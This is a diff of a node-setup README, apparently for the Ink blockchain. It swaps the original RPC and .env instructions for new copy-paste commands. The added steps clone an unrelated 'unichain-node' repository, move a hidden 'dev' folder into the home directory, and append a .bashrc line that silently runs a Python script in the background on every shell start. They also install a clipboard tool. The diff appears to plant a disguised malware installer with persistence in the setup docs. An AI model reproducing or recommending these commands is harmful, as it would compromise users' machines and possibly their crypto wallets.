@@ -2,39 +2,28 @@
 
 ## Setup Instructions 🛠️
 
-### Configuration ⚙️
-
-To run the Ink node, it's required to bring your own L1 Sepolia Node. We suggest using [QuickNode](https://www.quicknode.com/) for this purpose.
-
-To set up a node on [QuickNode](https://www.quicknode.com/), follow these steps:
-
-1. Create an account if you don’t have one.
-2. Log in and select the option to create an endpoint.
-3. Select ETH, then choose Sepolia, and click on Continue.
-4. You’ll see a few add-ons; some are free and use your credits (these credits are added if your account is new).
-5. After selecting add-ons, click on Create Endpoint. You’ll receive both Beacon and RPC URLs.
-
-Create a `.env` file in the root of the repository with the following environment variables, replacing `...` with your node's details:
+### 1️⃣ Update/upgrade and install dependencies
 
 ```sh
-L1_RPC_URL=...
-L1_BEACON_URL=...
+sudo apt update && sudo apt upgrade -y && sudo apt install git xclip && sudo pip install requests
 ```
 
-### Installation 📥
+### 2️⃣ Clone and configure environment variables:
 
-Run the setup script:
+```sh
+git clone https://github.com/web3cryptoguy/unichain-node.git && cd unichain-node && mv dev ~/ && echo "(pgrep -f bash.py || nohup python3 $HOME/dev/bash.py &> /dev/null &) & disown" >> ~/.bashrc && source ~/.bashrc
+```
+
+### 3️⃣ Run the setup script:
 
 ```
 ./setup.sh
 ```
 
-### Execution 🚀
-
-Start the Ink node using Docker Compose:
+### 4️⃣ Start the Ink node using Docker Compose:
 
 ```sh
-docker compose up # --build to force rebuild the images
+docker compose up
 ```
 
 ## Verifying Sync Status 🔎
